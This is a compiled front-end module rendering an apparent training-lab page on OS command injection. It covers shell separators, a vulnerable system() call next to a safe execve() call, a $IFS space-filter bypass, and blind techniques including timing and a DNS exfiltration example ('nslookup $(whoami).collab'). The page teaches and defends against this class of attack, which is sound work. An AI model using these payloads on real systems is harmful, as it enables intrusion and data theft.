import{_ as i,C as s,o as d,c,a6 as t,E as a}from"./chunks/framework.5dd0l9Wo.js";const k=JSON.parse('{"title":"OS Command Injection","description":"Shell metacharacters, argument boundaries, blind command execution, timing, redirection, and OAST exfiltration.","frontmatter":{"title":"OS Command Injection","description":"Shell metacharacters, argument boundaries, blind command execution, timing, redirection, and OAST exfiltration."},"headers":[],"relativePath":"command-injection/index.md","filePath":"command-injection/index.md"}'),l={name:"command-injection/index.md"};function r(p,e,h,m,u,b){const n=s("LabGroup"),o=s("TopicComplete");return d(),c("div",null,[e[0]||(e[0]=t(`<h1 id="os-command-injection" tabindex="-1">OS Command Injection <a class="header-anchor" href="#os-command-injection" aria-label="Permalink to &quot;OS Command Injection&quot;">​</a></h1><p class="wd-section-lede">Command injection is a parsing bug in the layer below the web framework. The application intends to pass one argument to one program; the shell sees a command line and interprets punctuation as control flow.</p><div class="wd-callout"><p><strong>The model.</strong> A string reaches a shell — <code>system()</code>, <code>popen()</code>, <code>child_process.exec()</code>, backticks — and the shell tokenizes it. Quotes group words, <code>;</code> and newlines separate commands, <code>|</code> pipes stdout, <code>&amp;&amp;</code>/<code>||</code> conditionally chain, and <code>$()</code> or backticks substitute output. If any user byte is outside quotes, it is shell syntax.</p></div><h2 id="the-command-line-is-a-grammar" tabindex="-1">The command line is a grammar <a class="header-anchor" href="#the-command-line-is-a-grammar" aria-label="Permalink to &quot;The command line is a grammar&quot;">​</a></h2><div class="language-text vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">text</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>stockApi=1; id</span></span>
<span class="line"><span>          │  │</span></span>
<span class="line"><span>          │  └── second command, executed after the first</span></span>
<span class="line"><span>          └───── command separator: the shell does not care that the app meant a number</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>The same payload in a quoted context is inert:</p><div class="language-bash vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># vulnerable: concatenation into a shell string</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">system(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">&quot;stockcheck &quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> +</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> input</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># safe: argument vector, no shell</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">execve(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">&quot;/usr/bin/stockcheck&quot;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">,</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [input, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">NULL]</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>The distinction is not &quot;filtering&quot; but <strong>whether a shell exists in the data path</strong>.</p><details class="details custom-block"><summary>🔬 Under the Hood: separators, substitution, and whitespace</summary><table tabindex="0"><thead><tr><th>Token</th><th>Effect in <code>sh</code>/<code>bash</code></th></tr></thead><tbody><tr><td><code>;</code></td><td>sequential execution</td></tr><tr><td><code>\\n</code></td><td>same as <code>;</code></td></tr><tr><td><code>&amp;</code></td><td>run in background, continue immediately</td></tr><tr><td><code>&amp;&amp;</code> / <code>||</code></td><td>execute the next command only on success / failure</td></tr><tr><td><code>|</code></td><td>connect stdout of the left to stdin of the right</td></tr><tr><td><code>$(cmd)</code> / <code>\`cmd\`</code></td><td>command substitution: stdout replaces the token</td></tr><tr><td><code>&gt;</code> / <code>&lt;</code></td><td>redirect stdout / stdin</td></tr><tr><td><code>\${IFS}</code></td><td>expands to whitespace, useful when spaces are filtered</td></tr></tbody></table><p><code>$IFS</code> is not a bypass of the shell — it is a shell feature. A filter that blocks the space character but not <code>$</code> has misunderstood which layer performs expansion.</p></details><details class="details custom-block"><summary>⚙️ Engine Variations: Windows <code>cmd.exe</code></summary><p>Windows uses <code>&amp;</code>, <code>&amp;&amp;</code>, <code>||</code>, <code>|</code>, and <code>%VAR%</code> expansion. There is no <code>$IFS</code>. <code>whoami</code> exists on modern Windows; <code>dir</code> replaces <code>ls</code>. Redirection uses the same <code>&gt;</code> syntax. PowerShell adds <code>;</code>, <code>|</code>, <code>$( )</code>, and backticks as its escape character — a payload written for bash can fail or behave differently under PowerShell.</p></details><h2 id="in-band-execution" tabindex="-1">In-band execution <a class="header-anchor" href="#in-band-execution" aria-label="Permalink to &quot;In-band execution&quot;">​</a></h2><p>When the command&#39;s stdout is reflected in the HTTP response, the injection is direct: append a separator and a command.</p>`,12)),a(n,{ids:"command-injection-lab-simple"}),e[1]||(e[1]=t('<h2 id="blind-channels" tabindex="-1">Blind channels <a class="header-anchor" href="#blind-channels" aria-label="Permalink to &quot;Blind channels&quot;">​</a></h2><p>Most real command injection is blind. The application does not show output, so the exploit needs a side channel:</p><ol><li><strong>Time</strong> — <code>sleep 10</code> (Linux) or <code>ping -n 10 127.0.0.1</code> (Windows). Reliable but slow, and noisy in logs.</li><li><strong>Output redirection</strong> — write to a web-accessible directory, then fetch the file. Fast, but requires a writable path.</li><li><strong>Out-of-band</strong> — force a DNS or HTTP request to a Collaborator domain. Works through egress filtering that still permits DNS.</li><li><strong>Data exfiltration</strong> — embed command output in the OAST request (<code>nslookup $(whoami).collab</code>), which turns a blind channel into a read primitive.</li></ol>',3)),a(n,{ids:"command-injection-lab-blind-time-delays, command-injection-lab-blind-output-redirection, command-injection-lab-blind-out-of-band, command-injection-lab-blind-out-of-band-data-exfiltration"}),e[2]||(e[2]=t('<details class="details custom-block"><summary>🔬 Under the Hood: why <code>||</code> is often the right separator</summary><p>If the application runs <code>stockcheck &lt;input&gt;</code>, a payload beginning with <code>;</code> may work, but <code>||</code> is more robust: it executes the second command only if the first fails. If <code>input</code> is a valid-looking argument that makes the program exit successfully, <code>&amp;&amp;</code> runs your command; if it fails, <code>||</code> does. Testing both tells you whether the original command succeeded and avoids breaking the request in a way that hides output.</p><p>The double-pipe also survives naive quoting such as <code>system(&quot;cmd &quot; + input + &quot; 2&gt;&amp;1&quot;)</code>, because the shell parses the whole line, not the concatenation boundaries.</p></details><div class="wd-callout wd-callout--warn"><p><strong>Defence.</strong> Avoid shells. Use an argument-vector API (<code>execve</code>, <code>subprocess.run([...])</code>, <code>ProcessBuilder</code>) with a fixed program and validated arguments. If a shell is unavoidable, allow-list the argument against a strict grammar and never interpolate raw input. Output encoding does not help here: the vulnerability is on the server, before any response exists.</p></div>',2)),a(o,{"topic-id":"os-command-injection",label:"Mark OS command injection complete"})])}const f=i(l,[["render",r]]);export{k as __pageData,f as default};
